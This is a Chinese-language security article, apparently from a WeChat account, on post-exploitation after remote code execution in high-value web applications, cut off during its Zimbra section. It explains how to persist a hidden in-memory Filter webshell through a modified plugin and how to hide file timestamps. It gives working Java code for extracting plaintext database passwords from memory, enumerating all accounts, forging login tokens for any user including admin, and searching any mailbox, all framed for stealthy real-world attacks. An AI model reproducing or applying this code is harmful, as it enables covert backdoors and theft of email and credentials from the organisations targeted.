---
title: High-value Web Application Post-RCE Penetration Research
url: https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456099362&idx=1&sn=d715fd63fd371cac92c6796893e28863&chksm=803c6bebb74be2fd81cbb57ce0e54638e1dc9ff84c13516390f2039afbafcf7375aa9c892a5e&scene=58&subscene=0#rd
source: 赛博回忆录
date: 2024-08-28
fetch_date: 2025-10-06T18:05:16.043585
---

# High-value Web Application Post-RCE Penetration Research

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwBbSlF2hibej5TRtibL01Tzzj1FMOIqVDM7yHicjoZqP1T8CGXbwRzEXSw/0?wx_fmt=jpeg)

# High-value Web Application Post-RCE Penetration Research

Skay

赛博回忆录

**议题概述**

议题分享了高价值系统如邮件服务器、网关设备、文档、企业知识管理与协同平台、单点登录平台、缺陷跟踪平台、IT运维管理软件、域管理团建、代码仓库管理等平台的RCE后利用研究，针对不同应用，通过部署高隐蔽性插件、废弃功能利用等方式实现运行时劫持Web容器请求处理逻辑以及在内存中植入高隐藏性的持久性后门，以植入到内存中的后门作为加载器，实现内存加载执行有效负载，后门代码逻辑及功能性负载负载均在内存中运行。通过对不同应用代码逻辑的逐一深入分析，研究了解决负载在内存中运行时遇到的多重类加载器类加载、规避系统文件校验防护、上下文解耦进行功能代码提取.........等问题的解决方法。实现了在不对目标发起额外网络请求及无文件落地的情况下在内存中执行有效负载，从而在高度隐蔽攻击行为下获取系统高价值信息如：邮件获取、明文密码记录、运维数据获取、未知密码下任意登录凭证获取、获取域控信息、单点登录劫持、痕迹清理等操作。进而利用现有的Webshell管理工具加密数据回传数据流量实现流量侧隐藏。从而达到在真实攻击场景中实现更加全面、隐蔽、长期的后利用信息收集及深入渗透。

今天不着重讨论漏洞本身，我们把目光着眼于后利用研究。当我们已经通过漏洞或者其它渠道，可以在运行着一些重要应用的目标服务器执行系统命令时，怎样更加全面、隐蔽、长期的收集应用中的关键信息。

**首先，哪些系统属于高价值Web应用？**

邮件服务器、网关设备、文档、企业知识管理与协同平台、单点登录平台、缺陷跟踪平台、IT运维管理软件、域管理团建、代码仓库管理平台....等

由于应用的特殊性，在真实的攻击场景中，往往需要对以上高价值系统进行更全面、隐蔽、长期信息获取。

**一、邮件服务器**

邮服是公司、企业以及目标机构内部信息中转的核心应用，其中存储的邮件本身、用户凭证等信息是攻击者渗透攻击的重要目标。很多攻击行动往往最终目的为邮服中某个邮件。

站在攻击者视角，针对邮服攻击场景总结以下常用后渗透功能：

长期稳定的后门、邮件获取(搜索邮件、导出指定用户邮件、根据日期用户过滤邮件等)、数据路连接信息获取、用户电话地址等详细信息、用户明文密码记录、登录任意用户以及最后的痕迹清理

Zimbra 是一个电子邮件和协作平台，包括聊天、视频会议、日历、 联系人、任务、文件共享/编辑，并且集成了Slack、Zoom、Dropbox 等内置功能。500 多个SaaS 合作伙伴以及2000 多家经销商都在使用 Zimbra 的产品。Zimbra 是全球开源电子邮件协作软件领域的领先供应商。其全球部署数量高达十万级

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwLZ6d89m8bksmCuiad5qPQLXZiccChX06XibeyGEEYdN2RW0ia6Gxw1CH2w/640?wx_fmt=png)

第一部分以zimbra为例简述，如何更全面隐蔽以及长期的获取其中的关键信息，

**首先是权限的持久化，后门隐蔽性问题**

为了提高后门的隐蔽性，采用无需落地的内存Shell，针对重启失效问题，可以采用agent形式，但是与其新增一个落地jar文件，不如修改已有文件。当然还需修改文件修改时间zimbra本身功能上支持插件扩展，且默认安装以下常用插件

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw4r4UuHLp9lqqSqxghJTialNLwPbMKTPqHHMB5eQu5e4osfY0NXt1wTA/640?wx_fmt=png)

将我们的内存Shell注入逻辑放到插件中，每次重启均会加载

zimbra 使用的中间件为Jetty，运行时注入一个/\* 的Filter，恶意Filter作为服务端以内存形式存在于系统中，每个请求都会经过FIlter处理，正常业务逻辑放行，只有当使用Godzilla客户端访问时，才会触发Filter中代码逻辑

避免服务重启导致Filter失效，修改zimbra-license-success插件，每次服务重启都会加载插件，对插件进行初始化，通过修改插件初始化逻辑com.zimbra.cs.network.license.service.LicenseService，使得每次重启都会注入恶意Filter内存马

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwvnu3gbh38G0bH7GxDqDj5F8iah9OoeFvic2YQ2o5iaCuEuq4jb1b3VAlg/640?wx_fmt=png)

至此，就实现了一个稳定、隐蔽且长期的后门。后门有了，我们如何获取到想要的数据？Zimbra本身提供了一系列SOAP API接口来操作邮件、用户，https://files.zimbra.com/docs/soap\_api/9.0.0/api-reference/index.html

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwL5jukLVbsNC0k0eQxVzicCp5ErejBM74CFCLJHfZn0n8aTJv3kOcicicA/640?wx_fmt=png)

同时提供python-zimbra库，提供处理创建 Zimbra SOAP 查询功能，并将Http请求其发送到后端进行处理。   总的来说我们可以通过发送Http请求来调用SOAP API来查到想要的数据，But真的要动静这么大么？数据信息在内存中获取而不调用Web API，从而使得获取信息更加隐蔽。接下来逐一分析如何在内存中获取各种数据信息：如何从成千上万Class中找到方法并返回我们想要的数据？切入点只能从已知功能入手例如已知的SOAP API存在以下命名空间

zimbraAccount 帐户服务包括用于检索、存储和管理用户帐户信息的命令。

zimbraAdmin 管理服务包括用于管理 Zimbra 的命令。

zimbraAdminExt 管理扩展服务包括用于管理 Zimbra 的附加命令。

zimbraMail 邮件服务包括用于管理邮件和日历信息的命令。

zimbraRepl zimbraRepl 服务包括用于管理 Zimbra 服务器复制的命令。

zimbraSync zimbraSync 服务包括使用同步管理设备的命令。

zimbraVoice zimbraVoice 服务包括与统一通信相关的命令。

通过对以上API接口请求调用栈分析，最终将我们想要的方法剥离出来。

但是debug过程中存在context 、上下文、request等与请求强相关的参数传入，从层层紧密嵌套的调用栈中解构出来某个方法或属性是一件比较棘手的问题。

回到问题出发点，我们获取的大部分邮件以及用户信息等必定以某种形式存储在系统中，各种类型的数据库或者其它存储容器，是否可以绕过复杂的调用栈与数据库直接交互获取数据？可以，但在zimbra不太适用。

经过对zimbraMail 接口的调试发现，邮件数据主要调用Lucene进行搜索查询，并不是常规的JDBC数据库方式，写一个搜索逻辑成本远远大于代码中寻找合适的Api进行调用。我们逐个分析每个功能需要调用的API

**1.数据库连接信息**

jdbc连接信息往往都以加密的方式存放在某个文件中，既然我们可以在运行时执行代码，不如直接获取内存中解密后的明文连接信息，通过debug后可知，jdbc连接信息存储在com.zimbra.cs.db.MySQL.MySQLConfig类中，

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwSic8OwyPGBBt7GzkmiaZXktJ29FcPN1eZtdQDHwCj2gdNZT01d8AMnyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwVg3Niae1ZibuGiafFcPZ5EpN35YJagIGK1u80VpqbYtqx4ZRSrzjt9DSw/640?wx_fmt=png)

很幸运地我们可以直接调用com.zimbra.cs.db.MySQL#getPoolConfig方法获取到数据库属性信息

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwxAQBIsHDTsKlrZk7A6tGYyPGSUnSN6kExVhvGPKib59aSp4icZ1mWIDw/640?wx_fmt=png)

因为方法以及类并不是public，这里还需要使用反射进行间接调用，具体实现代码如下：

```
try {Class unsafeClass = Class.forName("sun.misc.Unsafe");Field field = unsafeClass.getDeclaredField("theUnsafe");field.setAccessible(true);Unsafe unsafe = (Unsafe) field.get(null);Module baseModule = Object.class.getModule();Class currentClass = Main.class;long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));unsafe.putObject(currentClass, offset, baseModule);           Method methodgetpoolconfig = Class.forName("com.zimbra.cs.db.MySQL").getDeclaredMethod("getPoolConfig");methodgetpoolconfig.setAccessible(true);           Class mysqlconfigclass = Class.forName("com.zimbra.cs.db.MySQL$MySQLConfig");Method method = mysqlconfigclass.getDeclaredMethod("getDBProperties");method.setAccessible(true);Properties properties = (Properties) method.invoke(methodgetpoolconfig.invoke((MySQL)Db.getInstance()));password = properties.getProperty("password");} catch (Exception e) {throw new RuntimeException(e);}
```

执行效果如下

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwnG10vUic1HmkfMFX8sTG8jPEOLfMRy57tbTsfB8fLrGiaPwh13XhHHMw/640?wx_fmt=png)

**2.用户列表及详情获取**

这个相对来说比较简单，Zimbra将每个用户映射成具体的Account类(com.zimbra.cs.account.Account)，对象属性中保存着每个用户的电话 收集 公司 职务部门 办公室 地址等详细信息，通过com.zimbra.cs.account.Entry#getAttrs方法可以获取所用属性

Account对象的获取没有提供直接接口方法，通过对Zimbra代码分析，找到了com.zimbra.cs.account.Provisioning类，可以理解为此类未Zimbra核心配置类，对系统中的Account、Domain、Server等信息进行了统一管理，并提供接口进行访问，通过调用com.zimbra.cs.account.Provisioning#searchDirectory方法获取系统中所有Accounts，其参数构造如下SearchDirectoryOptions

```
Provisioning prov = Provisioning.getInstance();SearchDirectoryOptions options = new SearchDirectoryOptions();options.setDomain(null);options.setTypes("accounts");options.setMaxResults(5000);options.setFilterString(ZLdapFilterFactory.FilterId.ADMIN_SEARCH, null);options.setReturnAttrs(null);options.setSortOpt(SearchDirectoryOptions.SortOpt.SORT_ASCENDING);options.setSortAttr("name");options.setConvertIDNToAscii(true);options.setMakeObjectOpt(SearchDirectoryOptions.MakeObjectOpt.NO_DEFAULTS);List accounts = prov.searchDirectory(options);
```

执行效果如下

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabw3xhRxJlWxGUrk0PfUmEFI67Pms3OS0GNjVuw9LGhTy7tqG6CgYro7g/640?wx_fmt=png)

**3.生成任意用户登录凭证**

登录成功，肯定会生成有效的session返回给客户端，通过Debug 登录过程//todo调用栈，定位到com.zimbra.cs.service.AuthProvider#getAuthToken方法，构造参数及实现逻辑如下：

```
Account account = getAccounts(new String((byte[]) user.get("username")));AuthToken.TokenType tokenType = AuthToken.TokenType.fromCode("");    ZimbraAuthToken authToken = (ZimbraAuthToken) AuthProvider.getAuthToken(account, 0, tokenType);token = authToken.getEncoded();
```

获取admin邮箱登录凭证如下

![](https://mmbiz.qpic.cn/mmbiz_png/SHI5wib3tvAMo28mYicMzfo0libJQxxkiabwOuslYefPVibP7ArPNl9D58DOnic86DCfo0tCAbvHzF3v3NJ1j3RoW6Dw/640?wx_fmt=png)

**4.邮件信息获取**

所有邮件查询接口均在com.zimbra.cs.index.ZimbraQuery中，http调用栈中的方法调用稍显复杂 //todo调用栈

经过尝试无法找到可以独立于调用栈，去除上下文等参数的方式进行直接接口调用，所以尝试构造OperationContext、SearchParams、Mailbox等参数，其中OperationContext为http请求中的上下文、SearchParams为查询参数，经过调试发现通过操作SearchParams，可以实现邮件的精细过滤查找例如：根据用户查找(通过构造MailBox对象)、根据日期查找、根据关键词过滤查找等

```
//根据日期过滤某个账户下邮件内容public String getMailbyDate(Map user) throws Exception{HashMap resp = new HashMap();DbPool.startup();//        String queryString = "after:\"01/15/2023\" before:\"01/16/2024\"";String queryString = new String((byte[]) user.get("date"));Account account = getAccounts(new String((byte[]) user.get("username")));Mailbox mailbox = MailboxManager.getInstance().getMailboxByAccount(account);OperationContext octx = new OperationContext(account, true);octx.setmResponseProtocol(SoapProtocol.Soap12);SearchParams searchParams = new SearchParams();    searchParams.setQueryString(queryString);searchParams.setTypes("conversation");searchParams.setSortBy("dateDesc");ZimbraQuery query = new ZimbraQuery(octx, SoapProtocol.Soap12, mailbox, searchParams);ZimbraQueryResults zimbraQueryResults = query.execute();resp = p...